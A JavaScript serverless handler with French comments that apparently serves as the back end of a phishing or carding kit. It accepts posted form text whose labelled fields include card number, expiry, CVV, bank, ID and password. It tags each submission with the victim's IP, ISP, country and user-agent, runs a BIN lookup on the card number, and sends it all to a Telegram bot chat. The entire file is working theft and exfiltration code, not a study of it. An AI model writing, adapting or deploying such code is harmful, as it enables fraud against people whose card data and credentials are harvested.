// api/notify.js

const TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const CHAT         = process.env.TELEGRAM_CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: {
    bodyParser: false,
  },
};

// —————— AJOUT : fonction de lookup BIN à 8 chiffres ——————
async function getBinInfo(bin8) {
  try {
    const res = await fetch(
      `https://lookup.binlist.net/${bin8}`,
      { headers: { 'Accept-Version': '3' } }
    );
    if (!res.ok) return null;
    const d = await res.json();
    const num = d.number || {};
    return {
      scheme:       d.scheme?.toLowerCase() || '?',
      brand:        d.brand              || '?',
      length:       num.length           || '?',
      luhn:         num.luhn ? 'Yes' : 'No',
      type:         (d.type || '?').replace(/^./, s => s.toUpperCase()),
      prepaid:      d.prepaid ? 'Yes' : 'No',
      countryName:  d.country?.name      || '?',
      countryEmoji: d.country?.emoji     || '',
      latitude:     d.country?.latitude  || '?',
      longitude:    d.country?.longitude || '?',
      bankName:     d.bank?.name         || '?'
    };
  } catch {
    return null;
  }
}
// —————— FIN AJOUT ——————

// lit le body (JSON ou texte brut)
async function readBody(req) {
  const contentType = req.headers['content-type'] || '';
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString();
  if (contentType.includes('application/json')) {
    try { return JSON.parse(raw).message || '' }
    catch {}
  }
  return raw;
}

// récupère ISP + pays
async function geoLookup(ip) {
  let isp = 'inconnue', country = 'inconnue', countryCode = '';
  try {
    const r = await fetch(`https://ipinfo.io/${ip}/json${IPINFO_TOKEN?`?token=${IPINFO_TOKEN}`:''}`);
    if (r.ok) {
      const d = await r.json();
      if (d.org) isp = d.org.replace(/^AS\d+\s+/i,'');
      if (d.country) country = countryCode = d.country;
      return { isp, countryCode, country };
    }
  } catch {}
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const d = await r.json();
    if (d.success) return { isp: d.org||isp, countryCode: d.country_code, country: d.country||country };
  } catch {}
  try {
    const r = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`);
    const d = await r.json();
    if (d.status==='success') return { isp: d.isp.replace(/^AS\d+\s+/i,''), countryCode: d.countryCode, country: d.country };
  } catch {}
  return { isp, countryCode, country };
}

// nom complet du pays en français
function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length===2) {
    try {
      return new Intl.DisplayNames(['fr'],{type:'region'}).of(codeOrName);
    } catch {}
  }
  return codeOrName;
}

export default async function handler(req, res) {
  // CORS pré‐flight
  res.setHeader('Access-Control-Allow-Origin','*');
  res.setHeader('Access-Control-Allow-Methods','POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers','Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  // only POST
  if (req.method !== 'POST') {
    res.setHeader('Allow','POST, OPTIONS');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // read body
  const rawMsg = (await readBody(req)).trim();
  if (!rawMsg) return res.status(400).json({ error: 'Missing message' });

  // IP + UA
  const forwarded = req.headers['x-forwarded-for'];
  const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress || 'inconnue';
  const ua = req.headers['user-agent'] || 'inconnu';

  // geo lookup
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country||countryCode);

  // date & heure
  const now = new Date();
  const date = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'2-digit'});
  const time = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

  // icônes
  const iconMap = {
    étape:'📣', nom:'👤', prénom:'🙋', téléphone:'📞',
    email:'✉️', adresse:'🏠', carte:'💳', numéro:'🔢',
    exp:'📅', expiration:'📅', cvv:'🔒', banque:'🏦',
    id:'🆔', pass:'🔑', password:'🔑'
  };

  // construction du texte
  const lines = rawMsg.split('\n').map(l=>l.trim()).filter(Boolean);
  let text = '';
  for (const line of lines) {
    const low = line.toLowerCase();
    const key = Object.keys(iconMap).find(k=>low.startsWith(k));
    text += (key?iconMap[key]+' ':'') + line + '\n';
  }

  // infos système
  text += `\n🗓️ Date & heure : ${date}, ${time}\n`;
  text += `🌐 IP Client     : ${ip}\n`;
  text += `🔎 ISP Client    : ${isp}\n`;
  text += `🌍 Pays Client   : ${countryDisplay}\n`;
  text += `📍 User-Agent    : ${ua}\n`;
  text += `©️ ${now.getFullYear()} ©️`;

  // —————— AJOUT : lookup BIN avec format demandé ——————
  const m = rawMsg.match(/\b(\d{8,})/);
  if (m) {
    const info = await getBinInfo(m[1].slice(0,8));
    if (info) {
      text += `\n${info.scheme}\n\n`
           + `Brand\n${info.brand}\n\n`
           + `Card number\nLength ${info.length}\n\n`
           + `LUHN ${info.luhn}\n`
           + `Type ${info.type}\n`
           + `Prepaid ${info.prepaid}\n`
           + `Country\n${info.countryEmoji} ${info.countryName}\n\n`
           + `(latitude: ${info.latitude}, longitude: ${info.longitude})\n\n`
           + `Bank\n${info.bankName}\n\n`
           + `-\n\n-`;
    }
  }
  // —————— FIN AJOUT ——————

  // envoi Telegram en texte brut
  const tg = await fetch(
    `https://api.telegram.org/bot${TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT,
        text,
        disable_web_page_preview: true
      })
    }
  );
  const raw = await tg.text();

  return res
    .status(tg.ok?200:tg.status)
    .json({ ok: tg.ok, full: raw });
}